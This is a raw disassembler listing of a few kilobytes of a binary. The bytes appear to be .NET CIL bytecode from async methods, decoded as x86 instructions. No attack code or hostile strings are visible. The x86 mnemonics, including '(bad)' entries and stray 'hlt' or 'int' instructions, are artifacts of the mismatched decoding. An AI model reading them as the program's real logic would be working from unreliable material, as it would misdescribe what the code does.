  404763:	04 00                	add    $0x0,%al
  404765:	38 ef                	cmp    %ch,%bh
  404767:	02 00                	add    (%eax),%al
  404769:	00 02                	add    %al,(%edx)
  40476b:	7b 4f                	jnp    0x4047bc
  40476d:	00 00                	add    %al,(%eax)
  40476f:	04 7b                	add    $0x7b,%al
  404771:	13 00                	adc    (%eax),%eax
  404773:	00 04 18             	add    %al,(%eax,%ebx,1)
  404776:	fe 01                	incb   (%ecx)
  404778:	13 11                	adc    (%ecx),%edx
  40477a:	11 11                	adc    %edx,(%ecx)
  40477c:	39 d8                	cmp    %ebx,%eax
  40477e:	02 00                	add    (%eax),%al
  404780:	00 00                	add    %al,(%eax)
  404782:	02 02                	add    (%edx),%al
  404784:	7b 4e                	jnp    0x4047d4
  404786:	00 00                	add    %al,(%eax)
  404788:	04 6f                	add    $0x6f,%al
  40478a:	cd 00                	int    $0x0
  40478c:	00 0a                	add    %cl,(%edx)
  40478e:	6f                   	outsl  %ds:(%esi),(%dx)
  40478f:	ce                   	into
  404790:	00 00                	add    %al,(%eax)
  404792:	0a 6f fd             	or     -0x3(%edi),%ch
  404795:	00 00                	add    %al,(%eax)
  404797:	0a 72 17             	or     0x17(%edx),%dh
  40479a:	42                   	inc    %edx
  40479b:	00 70 6f             	add    %dh,0x6f(%eax)
  40479e:	fe 00                	incb   (%eax)
  4047a0:	00 0a                	add    %cl,(%edx)
  4047a2:	7d 5a                	jge    0x4047fe
  4047a4:	00 00                	add    %al,(%eax)
  4047a6:	04 02                	add    $0x2,%al
  4047a8:	7b 5a                	jnp    0x404804
  4047aa:	00 00                	add    %al,(%eax)
  4047ac:	04 6f                	add    $0x6f,%al
  4047ae:	ff 00                	incl   (%eax)
  4047b0:	00 0a                	add    %cl,(%edx)
  4047b2:	16                   	push   %ss
  4047b3:	31 1d 02 7b 5a 00    	xor    %ebx,0x5a7b02
  4047b9:	00 04 16             	add    %al,(%esi,%edx,1)
  4047bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4047bd:	00 01                	add    %al,(%ecx)
  4047bf:	00 0a                	add    %cl,(%edx)
  4047c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4047c2:	01 01                	add    %eax,(%ecx)
  4047c4:	00 0a                	add    %cl,(%edx)
  4047c6:	72 2d                	jb     0x4047f5
  4047c8:	42                   	inc    %edx
  4047c9:	00 70 6f             	add    %dh,0x6f(%eax)
  4047cc:	d7                   	xlat   %ds:(%ebx)
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	0a 2b                	or     (%ebx),%ch
  4047d1:	01 16                	add    %edx,(%esi)
  4047d3:	13 12                	adc    (%edx),%edx
  4047d5:	11 12                	adc    %edx,(%edx)
  4047d7:	39 69 02             	cmp    %ebp,0x2(%ecx)
  4047da:	00 00                	add    %al,(%eax)
  4047dc:	00 02                	add    %al,(%edx)
  4047de:	7b 4f                	jnp    0x40482f
  4047e0:	00 00                	add    %al,(%eax)
  4047e2:	04 7b                	add    $0x7b,%al
  4047e4:	20 00                	and    %al,(%eax)
  4047e6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4047e9:	29 00                	sub    %eax,(%eax)
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	13 13                	adc    (%ebx),%edx
  4047ef:	11 13                	adc    %edx,(%ebx)
  4047f1:	2c 1f                	sub    $0x1f,%al
  4047f3:	00 02                	add    %al,(%edx)
  4047f5:	72 59                	jb     0x404850
  4047f7:	42                   	inc    %edx
  4047f8:	00 70 02             	add    %dh,0x2(%eax)
  4047fb:	7b 4f                	jnp    0x40484c
  4047fd:	00 00                	add    %al,(%eax)
  4047ff:	04 7b                	add    $0x7b,%al
  404801:	1f                   	pop    %ds
  404802:	00 00                	add    %al,(%eax)
  404804:	04 28                	add    $0x28,%al
  404806:	1a 00                	sbb    (%eax),%al
  404808:	00 0a                	add    %cl,(%edx)
  40480a:	7d 5b                	jge    0x404867
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 00                	add    $0x0,%al
  404810:	2b 1d 00 02 72 ea    	sub    0xea720200,%ebx
  404816:	42                   	inc    %edx
  404817:	00 70 02             	add    %dh,0x2(%eax)
  40481a:	7b 4f                	jnp    0x40486b
  40481c:	00 00                	add    %al,(%eax)
  40481e:	04 7b                	add    $0x7b,%al
  404820:	20 00                	and    %al,(%eax)
  404822:	00 04 28             	add    %al,(%eax,%ebp,1)
  404825:	1a 00                	sbb    (%eax),%al
  404827:	00 0a                	add    %cl,(%edx)
  404829:	7d 5b                	jge    0x404886
  40482b:	00 00                	add    %al,(%eax)
  40482d:	04 00                	add    $0x0,%al
  40482f:	02 7e 04             	add    0x4(%esi),%bh
  404832:	00 00                	add    %al,(%eax)
  404834:	04 7d                	add    $0x7d,%al
  404836:	5c                   	pop    %esp
  404837:	00 00                	add    %al,(%eax)
  404839:	04 02                	add    $0x2,%al
  40483b:	02 7b 5c             	add    0x5c(%ebx),%bh
  40483e:	00 00                	add    %al,(%eax)
  404840:	04 1f                	add    $0x1f,%al
  404842:	0e                   	push   %cs
  404843:	8d 10                	lea    (%eax),%edx
  404845:	00 00                	add    %al,(%eax)
  404847:	01 25 16 02 7b 4f    	add    %esp,0x4f7b0216
  40484d:	00 00                	add    %al,(%eax)
  40484f:	04 7b                	add    $0x7b,%al
  404851:	19 00                	sbb    %eax,(%eax)
  404853:	00 04 8c             	add    %al,(%esp,%ecx,4)
  404856:	58                   	pop    %eax
  404857:	00 00                	add    %al,(%eax)
  404859:	01 a2 25 17 02 7b    	add    %esp,0x7b021725(%edx)
  40485f:	4f                   	dec    %edi
  404860:	00 00                	add    %al,(%eax)
  404862:	04 7b                	add    $0x7b,%al
  404864:	14 00                	adc    $0x0,%al
  404866:	00 04 8e             	add    %al,(%esi,%ecx,4)
  404869:	69 8c 58 00 00 01 a2 	imul   $0x7b021825,-0x5dff0000(%eax,%ebx,2),%ecx
  404870:	25 18 02 7b 
  404874:	4f                   	dec    %edi
  404875:	00 00                	add    %al,(%eax)
  404877:	04 7b                	add    $0x7b,%al
  404879:	14 00                	adc    $0x0,%al
  40487b:	00 04 8e             	add    %al,(%esi,%ecx,4)
  40487e:	69 8c 58 00 00 01 a2 	imul   $0x7b021925,-0x5dff0000(%eax,%ebx,2),%ecx
  404885:	25 19 02 7b 
  404889:	4f                   	dec    %edi
  40488a:	00 00                	add    %al,(%eax)
  40488c:	04 7b                	add    $0x7b,%al
  40488e:	15 00 00 04 28       	adc    $0x28040000,%eax
  404893:	48                   	dec    %eax
  404894:	00 00                	add    %al,(%eax)
  404896:	0a a2 25 1a 02 7b    	or     0x7b021a25(%edx),%ah
  40489c:	4f                   	dec    %edi
  40489d:	00 00                	add    %al,(%eax)
  40489f:	04 7b                	add    $0x7b,%al
  4048a1:	17                   	pop    %ss
  4048a2:	00 00                	add    %al,(%eax)
  4048a4:	04 28                	add    $0x28,%al
  4048a6:	48                   	dec    %eax
  4048a7:	00 00                	add    %al,(%eax)
  4048a9:	0a a2 25 1b 02 7b    	or     0x7b021b25(%edx),%ah
  4048af:	4f                   	dec    %edi
  4048b0:	00 00                	add    %al,(%eax)
  4048b2:	04 7b                	add    $0x7b,%al
  4048b4:	14 00                	adc    $0x0,%al
  4048b6:	00 04 8e             	add    %al,(%esi,%ecx,4)
  4048b9:	69 8c 58 00 00 01 a2 	imul   $0x7b021c25,-0x5dff0000(%eax,%ebx,2),%ecx
  4048c0:	25 1c 02 7b 
  4048c4:	4f                   	dec    %edi
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	04 7b                	add    $0x7b,%al
  4048c9:	16                   	push   %ss
  4048ca:	00 00                	add    %al,(%eax)
  4048cc:	04 28                	add    $0x28,%al
  4048ce:	48                   	dec    %eax
  4048cf:	00 00                	add    %al,(%eax)
  4048d1:	0a a2 25 1d 02 7b    	or     0x7b021d25(%edx),%ah
  4048d7:	4f                   	dec    %edi
  4048d8:	00 00                	add    %al,(%eax)
  4048da:	04 7b                	add    $0x7b,%al
  4048dc:	21 00                	and    %eax,(%eax)
  4048de:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4048e1:	25 1e 02 7b 4f       	and    $0x4f7b021e,%eax
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	04 7b                	add    $0x7b,%al
  4048ea:	17                   	pop    %ss
  4048eb:	00 00                	add    %al,(%eax)
  4048ed:	04 28                	add    $0x28,%al
  4048ef:	48                   	dec    %eax
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	0a a2 25 1f 09 02    	or     0x2091f25(%edx),%ah
  4048f8:	7b 4f                	jnp    0x404949
  4048fa:	00 00                	add    %al,(%eax)
  4048fc:	04 7b                	add    $0x7b,%al
  4048fe:	18 00                	sbb    %al,(%eax)
  404900:	00 04 8c             	add    %al,(%esp,%ecx,4)
  404903:	58                   	pop    %eax
  404904:	00 00                	add    %al,(%eax)
  404906:	01 a2 25 1f 0a 02    	add    %esp,0x20a1f25(%edx)
  40490c:	7b 4f                	jnp    0x40495d
  40490e:	00 00                	add    %al,(%eax)
  404910:	04 7b                	add    $0x7b,%al
  404912:	18 00                	sbb    %al,(%eax)
  404914:	00 04 8c             	add    %al,(%esp,%ecx,4)
  404917:	58                   	pop    %eax
  404918:	00 00                	add    %al,(%eax)
  40491a:	01 a2 25 1f 0b 02    	add    %esp,0x20b1f25(%edx)
  404920:	7b 4f                	jnp    0x404971
  404922:	00 00                	add    %al,(%eax)
  404924:	04 7b                	add    $0x7b,%al
  404926:	19 00                	sbb    %eax,(%eax)
  404928:	00 04 8c             	add    %al,(%esp,%ecx,4)
  40492b:	58                   	pop    %eax
  40492c:	00 00                	add    %al,(%eax)
  40492e:	01 a2 25 1f 0c 02    	add    %esp,0x20c1f25(%edx)
  404934:	7b 4f                	jnp    0x404985
  404936:	00 00                	add    %al,(%eax)
  404938:	04 7b                	add    $0x7b,%al
  40493a:	15 00 00 04 a2       	adc    $0xa2040000,%eax
  40493f:	25 1f 0d 02 7b       	and    $0x7b020d1f,%eax
  404944:	5b                   	pop    %ebx
  404945:	00 00                	add    %al,(%eax)
  404947:	04 a2                	add    $0xa2,%al
  404949:	28 2f                	sub    %ch,(%edi)
  40494b:	00 00                	add    %al,(%eax)
  40494d:	0a 7d 5c             	or     0x5c(%ebp),%bh
  404950:	00 00                	add    %al,(%eax)
  404952:	04 02                	add    $0x2,%al
  404954:	7b 4e                	jnp    0x4049a4
  404956:	00 00                	add    %al,(%eax)
  404958:	04 6f                	add    $0x6f,%al
  40495a:	cd 00                	int    $0x0
  40495c:	00 0a                	add    %cl,(%edx)
  40495e:	6f                   	outsl  %ds:(%esi),(%dx)
  40495f:	f0 00 00             	lock add %al,(%eax)
  404962:	0a 6f f1             	or     -0xf(%edi),%ch
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 20                	or     (%eax),%ah
  404969:	f4                   	hlt
  40496a:	01 00                	add    %eax,(%eax)
  40496c:	00 fe                	add    %bh,%dh
  40496e:	01 13                	add    %edx,(%ebx)
  404970:	14 11                	adc    $0x11,%al
  404972:	14 2c                	adc    $0x2c,%al
  404974:	38 00                	cmp    %al,(%eax)
  404976:	02 7b 4e             	add    0x4e(%ebx),%bh
  404979:	00 00                	add    %al,(%eax)
  40497b:	04 6f                	add    $0x6f,%al
  40497d:	cd 00                	int    $0x0
  40497f:	00 0a                	add    %cl,(%edx)
  404981:	6f                   	outsl  %ds:(%esi),(%dx)
  404982:	f0 00 00             	lock add %al,(%eax)
  404985:	0a 20                	or     (%eax),%ah
  404987:	c8 00 00 00          	enter  $0x0,$0x0
  40498b:	6f                   	outsl  %ds:(%esi),(%dx)
  40498c:	02 01                	add    (%ecx),%al
  40498e:	00 0a                	add    %cl,(%edx)
  404990:	00 02                	add    %al,(%edx)
  404992:	7b 4e                	jnp    0x4049e2
  404994:	00 00                	add    %al,(%eax)
  404996:	04 6f                	add    $0x6f,%al
  404998:	cd 00                	int    $0x0
  40499a:	00 0a                	add    %cl,(%edx)
  40499c:	6f                   	outsl  %ds:(%esi),(%dx)
  40499d:	f0 00 00             	lock add %al,(%eax)
  4049a0:	0a 72 71             	or     0x71(%edx),%dh
  4049a3:	43                   	inc    %ebx
  4049a4:	00 70 6f             	add    %dh,0x6f(%eax)
  4049a7:	03 01                	add    (%ecx),%eax
  4049a9:	00 0a                	add    %cl,(%edx)
  4049ab:	00 00                	add    %al,(%eax)
  4049ad:	02 7b 4e             	add    0x4e(%ebx),%bh
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	04 02                	add    $0x2,%al
  4049b4:	7b 5c                	jnp    0x404a12
  4049b6:	00 00                	add    %al,(%eax)
  4049b8:	04 6f                	add    $0x6f,%al
  4049ba:	fc                   	cld
  4049bb:	00 00                	add    %al,(%eax)
  4049bd:	0a 00                	or     (%eax),%al
  4049bf:	02 7b 4f             	add    0x4f(%ebx),%bh
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	04 72                	add    $0x72,%al
  4049c6:	77 43                	ja     0x404a0b
  4049c8:	00 70 12             	add    %dh,0x12(%eax)
  4049cb:	03 fe                	add    %esi,%edi
  4049cd:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  4049d2:	09 28                	or     %ebp,(%eax)
  4049d4:	1e                   	push   %ds
  4049d5:	00 00                	add    %al,(%eax)
  4049d7:	06                   	push   %es
  4049d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4049d9:	c1 00 00             	roll   $0x0,(%eax)
  4049dc:	0a 13                	or     (%ebx),%dl
  4049de:	15 12 15 28 c2       	adc    $0xc2281512,%eax
  4049e3:	00 00                	add    %al,(%eax)
  4049e5:	0a 2d 46 02 1e 25    	or     0x251e0246,%ch
  4049eb:	0a 7d 4b             	or     0x4b(%ebp),%bh
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	04 02                	add    $0x2,%al
  4049f2:	11 15 7d 5d 00 00    	adc    %edx,0x5d7d
  4049f8:	04 02                	add    $0x2,%al
  4049fa:	13 04 02             	adc    (%edx,%eax,1),%eax
  4049fd:	7c 4c                	jl     0x404a4b
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	04 12                	add    $0x12,%al
  404a03:	15 12 04 28 10       	adc    $0x10280412,%eax
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	2b 00                	sub    (%eax),%eax
  404a0c:	dd 8f 00 00 00 02    	fisttpll 0x2000000(%edi)
  404a12:	7b 5d                	jnp    0x404a71
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 13                	add    $0x13,%al
  404a18:	15 02 7c 5d 00       	adc    $0x5d7c02,%eax
  404a1d:	00 04 fe             	add    %al,(%esi,%edi,8)
  404a20:	15 1c 00 00 01       	adc    $0x100001c,%eax
  404a25:	02 15 25 0a 7d 4b    	add    0x4b7d0a25,%dl
  404a2b:	00 00                	add    %al,(%eax)
  404a2d:	04 12                	add    $0x12,%al
  404a2f:	15 28 c3 00 00       	adc    $0xc328,%eax
  404a34:	0a 00                	or     (%eax),%al
  404a36:	00 02                	add    %al,(%edx)
  404a38:	14 7d                	adc    $0x7d,%al
  404a3a:	5b                   	pop    %ebx
  404a3b:	00 00                	add    %al,(%eax)
  404a3d:	04 02                	add    $0x2,%al
  404a3f:	14 7d                	adc    $0x7d,%al
  404a41:	5c                   	pop    %esp
  404a42:	00 00                	add    %al,(%eax)
  404a44:	04 02                	add    $0x2,%al
  404a46:	7b 4f                	jnp    0x404a97
  404a48:	00 00                	add    %al,(%eax)
  404a4a:	04 16                	add    $0x16,%al
  404a4c:	7d 13                	jge    0x404a61
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	04 00                	add    $0x0,%al
  404a52:	02 14 7d 5a 00 00 04 	add    0x400005a(,%edi,2),%dl
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	02 14 7d 51 00 00 04 	add    0x4000051(,%edi,2),%dl
  404a62:	de 21                	fisubs (%ecx)
  404a64:	13 16                	adc    (%esi),%edx
  404a66:	02 1f                	add    (%edi),%bl
  404a68:	fe                   	(bad)
  404a69:	7d 4b                	jge    0x404ab6
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	04 02                	add    $0x2,%al
  404a6f:	14 7d                	adc    $0x7d,%al
  404a71:	50                   	push   %eax
  404a72:	00 00                	add    %al,(%eax)
  404a74:	04 02                	add    $0x2,%al
  404a76:	7c 4c                	jl     0x404ac4
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 11                	add    $0x11,%al
  404a7c:	16                   	push   %ss
  404a7d:	28 d9                	sub    %bl,%cl
  404a7f:	00 00                	add    %al,(%eax)
  404a81:	0a 00                	or     (%eax),%al
  404a83:	de 1b                	ficomps (%ebx)
  404a85:	02 1f                	add    (%edi),%bl
  404a87:	fe                   	(bad)
  404a88:	7d 4b                	jge    0x404ad5
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	04 02                	add    $0x2,%al
  404a8e:	14 7d                	adc    $0x7d,%al
  404a90:	50                   	push   %eax
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 02                	add    $0x2,%al
  404a95:	7c 4c                	jl     0x404ae3
  404a97:	00 00                	add    %al,(%eax)
  404a99:	04 28                	add    $0x28,%al
  404a9b:	da 00                	fiaddl (%eax)
  404a9d:	00 0a                	add    %cl,(%edx)
  404a9f:	00 2a                	add    %ch,(%edx)
  404aa1:	00 00                	add    %al,(%eax)
  404aa3:	00 41 34             	add    %al,0x34(%ecx)
  404aa6:	00 00                	add    %al,(%eax)
  404aa8:	02 00                	add    (%eax),%al
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	df 01                	filds  (%ecx)
  404aae:	00 00                	add    %al,(%eax)
  404ab0:	3d 05 00 00 1c       	cmp    $0x1c000005,%eax
  404ab5:	07                   	pop    %es
  404ab6:	00 00                	add    %al,(%eax)
  404ab8:	19 00                	sbb    %eax,(%eax)
	...
  404ac2:	00 00                	add    %al,(%eax)
  404ac4:	07                   	pop    %es
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	00 41 0a             	add    %al,0xa(%ecx)
  404aca:	00 00                	add    %al,(%eax)
  404acc:	48                   	dec    %eax
  404acd:	0a 00                	or     (%eax),%al
  404acf:	00 21                	add    %ah,(%ecx)
  404ad1:	00 00                	add    %al,(%eax)
  404ad3:	00 1d 00 00 01 06    	add    %bl,0x6010000
  404ad9:	2a 22                	sub    (%edx),%ah
  404adb:	02 28                	add    (%eax),%ch
  404add:	22 00                	and    (%eax),%al
  404adf:	00 0a                	add    %cl,(%edx)
  404ae1:	00 2a                	add    %ch,(%edx)
  404ae3:	00 1b                	add    %bl,(%ebx)
  404ae5:	30 03                	xor    %al,(%ebx)
  404ae7:	00 bf 00 00 00 17    	add    %bh,0x17000000(%edi)
  404aed:	00 00                	add    %al,(%eax)
  404aef:	11 02                	adc    %eax,(%edx)
  404af1:	7b 5f                	jnp    0x404b52
  404af3:	00 00                	add    %al,(%eax)
  404af5:	04 0a                	add    $0xa,%al
  404af7:	06                   	push   %es
  404af8:	2c 02                	sub    $0x2,%al
  404afa:	2b 02                	sub    (%edx),%eax
  404afc:	2b 5b 00             	sub    0x0(%ebx),%ebx
  404aff:	02 7b 63             	add    0x63(%ebx),%bh
  404b02:	00 00                	add    %al,(%eax)
  404b04:	04 7b                	add    $0x7b,%al
  404b06:	1e                   	push   %ds
  404b07:	00 00                	add    %al,(%eax)
  404b09:	04 0b                	add    $0xb,%al
  404b0b:	07                   	pop    %es
  404b0c:	2c 70                	sub    $0x70,%al
  404b0e:	00 02                	add    %al,(%edx)
  404b10:	7b 63                	jnp    0x404b75
  404b12:	00 00                	add    %al,(%eax)
  404b14:	04 02                	add    $0x2,%al
  404b16:	7b 61                	jnp    0x404b79
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	04 02                	add    $0x2,%al
  404b1c:	7b 62                	jnp    0x404b80
  404b1e:	00 00                	add    %al,(%eax)
  404b20:	04 28                	add    $0x28,%al
  404b22:	1e                   	push   %ds
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	6f                   	outsl  %ds:(%esi),(%dx)
  404b27:	c1 00 00             	roll   $0x0,(%eax)
  404b2a:	0a 0c 12             	or     (%edx,%edx,1),%cl
  404b2d:	02 28                	add    (%eax),%ch
  404b2f:	c2 00 00             	ret    $0x0
  404b32:	0a 2d 40 02 16 25    	or     0x25160240,%ch
  404b38:	0a 7d 5f             	or     0x5f(%ebp),%bh
  404b3b:	00 00                	add    %al,(%eax)
  404b3d:	04 02                	add    $0x2,%al
  404b3f:	08 7d 64             	or     %bh,0x64(%ebp)
  404b42:	00 00                	add    %al,(%eax)
  404b44:	04 02                	add    $0x2,%al
  404b46:	0d 02 7c 60 00       	or     $0x607c02,%eax
  404b4b:	00 04 12             	add    %al,(%edx,%edx,1)
  404b4e:	02 12                	add    (%edx),%dl
  404b50:	03 28                	add    (%eax),%ebp
  404b52:	17                   	pop    %ss
  404b53:	00 00                	add    %al,(%eax)
  404b55:	2b 00                	sub    (%eax),%eax
  404b57:	de 55 02             	ficoms 0x2(%ebp)
  404b5a:	7b 64                	jnp    0x404bc0
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 0c                	add    $0xc,%al
  404b60:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  404b64:	00 04 fe             	add    %al,(%esi,%edi,8)
  404b67:	15 1c 00 00 01       	adc    $0x100001c,%eax
  404b6c:	02 15 25 0a 7d 5f    	add    0x5f7d0a25,%dl
  404b72:	00 00                	add    %al,(%eax)
  404b74:	04 12                	add    $0x12,%al
  404b76:	02 28                	add    (%eax),%ch
  404b78:	c3                   	ret
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	0a 00                	or     (%eax),%al
  404b7d:	00 de                	add    %bl,%dh
  404b7f:	1a 13                	sbb    (%ebx),%dl
  404b81:	04 02                	add    $0x2,%al
  404b83:	1f                   	pop    %ds
  404b84:	fe                   	(bad)
  404b85:	7d 5f                	jge    0x404be6
  404b87:	00 00                	add    %al,(%eax)
  404b89:	04 02                	add    $0x2,%al
  404b8b:	7c 60                	jl     0x404bed
  404b8d:	00 00                	add    %al,(%eax)
  404b8f:	04 11                	add    $0x11,%al
  404b91:	04 28                	add    $0x28,%al
  404b93:	d9 00                	flds   (%eax)
  404b95:	00 0a                	add    %cl,(%edx)
  404b97:	00 de                	add    %bl,%dh
  404b99:	14 02                	adc    $0x2,%al
  404b9b:	1f                   	pop    %ds
  404b9c:	fe                   	(bad)
  404b9d:	7d 5f                	jge    0x404bfe
  404b9f:	00 00                	add    %al,(%eax)
  404ba1:	04 02                	add    $0x2,%al
  404ba3:	7c 60                	jl     0x404c05
  404ba5:	00 00                	add    %al,(%eax)
  404ba7:	04 28                	add    $0x28,%al
  404ba9:	da 00                	fiaddl (%eax)
  404bab:	00 0a                	add    %cl,(%edx)
  404bad:	00 2a                	add    %ch,(%edx)
  404baf:	00 01                	add    %al,(%ecx)
  404bb1:	10 00                	adc    %al,(%eax)
  404bb3:	00 00                	add    %al,(%eax)
  404bb5:	00 07                	add    %al,(%edi)
  404bb7:	00 89 90 00 1a 1d    	add    %cl,0x1d1a0090(%ecx)
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	01 06                	add    %eax,(%esi)
  404bc1:	2a 22                	sub    (%edx),%ah
  404bc3:	02 28                	add    (%eax),%ch
  404bc5:	22 00                	and    (%eax),%al
  404bc7:	00 0a                	add    %cl,(%edx)
  404bc9:	00 2a                	add    %ch,(%edx)
  404bcb:	00 1b                	add    %bl,(%ebx)
  404bcd:	30 03                	xor    %al,(%ebx)
  404bcf:	00 10                	add    %dl,(%eax)
  404bd1:	01 00                	add    %eax,(%eax)
  404bd3:	00 18                	add    %bl,(%eax)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	11 02                	adc    %eax,(%edx)
  404bd9:	7b 65                	jnp    0x404c40
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 0a                	add    $0xa,%al
  404bdf:	06                   	push   %es
  404be0:	2c 02                	sub    $0x2,%al
  404be2:	2b 02                	sub    (%edx),%eax
  404be4:	2b 47 00             	sub    0x0(%edi),%eax
  404be7:	02 7b 69             	add    0x69(%ebx),%bh
  404bea:	00 00                	add    %al,(%eax)
  404bec:	04 7b                	add    $0x7b,%al
  404bee:	0f 00 00             	sldt   (%eax)
  404bf1:	04 6f                	add    $0x6f,%al
  404bf3:	04 01                	add    $0x1,%al
  404bf5:	00 0a                	add    %cl,(%edx)
  404bf7:	6f                   	outsl  %ds:(%esi),(%dx)
  404bf8:	c1 00 00             	roll   $0x0,(%eax)
  404bfb:	0a 0b                	or     (%ebx),%cl
  404bfd:	12 01                	adc    (%ecx),%al
  404bff:	28 c2                	sub    %al,%dl
  404c01:	00 00                	add    %al,(%eax)
  404c03:	0a 2d 43 02 16 25    	or     0x25160243,%ch
  404c09:	0a 7d 65             	or     0x65(%ebp),%bh
  404c0c:	00 00                	add    %al,(%eax)
  404c0e:	04 02                	add    $0x2,%al
  404c10:	07                   	pop    %es
  404c11:	7d 6b                	jge    0x404c7e
  404c13:	00 00                	add    %al,(%eax)
  404c15:	04 02                	add    $0x2,%al
  404c17:	0c 02                	or     $0x2,%al
  404c19:	7c 66                	jl     0x404c81
  404c1b:	00 00                	add    %al,(%eax)
  404c1d:	04 12                	add    $0x12,%al
  404c1f:	01 12                	add    %edx,(%edx)
  404c21:	02 28                	add    (%eax),%ch
  404c23:	18 00                	sbb    %al,(%eax)
  404c25:	00 2b                	add    %ch,(%ebx)
  404c27:	00 dd                	add    %bl,%ch
  404c29:	ba 00 00 00 02       	mov    $0x2000000,%edx
  404c2e:	7b 6b                	jnp    0x404c9b
  404c30:	00 00                	add    %al,(%eax)
  404c32:	04 0b                	add    $0xb,%al
  404c34:	02 7c 6b 00          	add    0x0(%ebx,%ebp,2),%bh
  404c38:	00 04 fe             	add    %al,(%esi,%edi,8)
  404c3b:	15 1c 00 00 01       	adc    $0x100001c,%eax
  404c40:	02 15 25 0a 7d 65    	add    0x657d0a25,%dl
  404c46:	00 00                	add    %al,(%eax)
  404c48:	04 12                	add    $0x12,%al
  404c4a:	01 28                	add    %ebp,(%eax)
  404c4c:	c3                   	ret
  404c4d:	00 00                	add    %al,(%eax)
  404c4f:	0a 00                	or     (%eax),%al
  404c51:	02 7c 68 00          	add    0x0(%eax,%ebp,2),%bh
  404c55:	00 04 28             	add    %al,(%eax,%ebp,1)
  404c58:	05 01 00 0a 0d       	add    $0xd0a0001,%eax
  404c5d:	09 2c 38             	or     %ebp,(%eax,%edi,1)
  404c60:	00 02                	add    %al,(%edx)
  404c62:	28 06                	sub    %al,(%esi)
  404c64:	01 00                	add    %eax,(%eax)
  404c66:	0a 7d 6a             	or     0x6a(%ebp),%bh
  404c69:	00 00                	add    %al,(%eax)
  404c6b:	04 02                	add    $0x2,%al
  404c6d:	7c 68                	jl     0x404cd7
  404c6f:	00 00                	add    %al,(%eax)
  404c71:	04 28                	add    $0x28,%al
  404c73:	07                   	pop    %es
  404c74:	01 00                	add    %eax,(%eax)
  404c76:	0a 28                	or     (%eax),%ch
  404c78:	08 01                	or     %al,(%ecx)
  404c7a:	00 0a                	add    %cl,(%edx)
  404c7c:	00 02                	add    %al,(%edx)
  404c7e:	7b 67                	jnp    0x404ce7
  404c80:	00 00                	add    %al,(%eax)
  404c82:	04 28                	add    $0x28,%al
  404c84:	19 00                	sbb    %eax,(%eax)
  404c86:	00 0a                	add    %cl,(%edx)
  404c88:	00 02                	add    %al,(%edx)
  404c8a:	7b 6a                	jnp    0x404cf6
  404c8c:	00 00                	add    %al,(%eax)
  404c8e:	04 28                	add    $0x28,%al
  404c90:	08 01                	or     %al,(%ecx)
  404c92:	00 0a                	add    %cl,(%edx)
  404c94:	00 00                	add    %al,(%eax)
  404c96:	2b 0e                	sub    (%esi),%ecx
  404c98:	00 02                	add    %al,(%edx)
  404c9a:	7b 67                	jnp    0x404d03
  404c9c:	00 00                	add    %al,(%eax)
  404c9e:	04 28                	add    $0x28,%al
  404ca0:	19 00                	sbb    %eax,(%eax)
  404ca2:	00 0a                	add    %cl,(%edx)
  404ca4:	00 00                	add    %al,(%eax)
  404ca6:	02 7b 69             	add    0x69(%ebx),%bh
  404ca9:	00 00                	add    %al,(%eax)
  404cab:	04 7b                	add    $0x7b,%al
  404cad:	0f 00 00             	sldt   (%eax)
  404cb0:	04 6f                	add    $0x6f,%al
  404cb2:	09 01                	or     %eax,(%ecx)
  404cb4:	00 0a                	add    %cl,(%edx)
  404cb6:	26 de 1a             	ficomps %es:(%edx)
  404cb9:	13 04 02             	adc    (%edx,%eax,1),%eax
  404cbc:	1f                   	pop    %ds
  404cbd:	fe                   	(bad)
  404cbe:	7d 65                	jge    0x404d25
  404cc0:	00 00                	add    %al,(%eax)
  404cc2:	04 02                	add    $0x2,%al
  404cc4:	7c 66                	jl     0x404d2c
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	04 11                	add    $0x11,%al
  404cca:	04 28                	add    $0x28,%al
  404ccc:	d9 00                	flds   (%eax)
  404cce:	00 0a                	add    %cl,(%edx)
  404cd0:	00 de                	add    %bl,%dh
  404cd2:	14 02                	adc    $0x2,%al
  404cd4:	1f                   	pop    %ds
  404cd5:	fe                   	(bad)
  404cd6:	7d 65                	jge    0x404d3d
  404cd8:	00 00                	add    %al,(%eax)
  404cda:	04 02                	add    $0x2,%al
  404cdc:	7c 66                	jl     0x404d44
  404cde:	00 00                	add    %al,(%eax)
  404ce0:	04 28                	add    $0x28,%al
  404ce2:	da 00                	fiaddl (%eax)
  404ce4:	00 0a                	add    %cl,(%edx)
  404ce6:	00 2a                	add    %ch,(%edx)
  404ce8:	01 10                	add    %edx,(%eax)
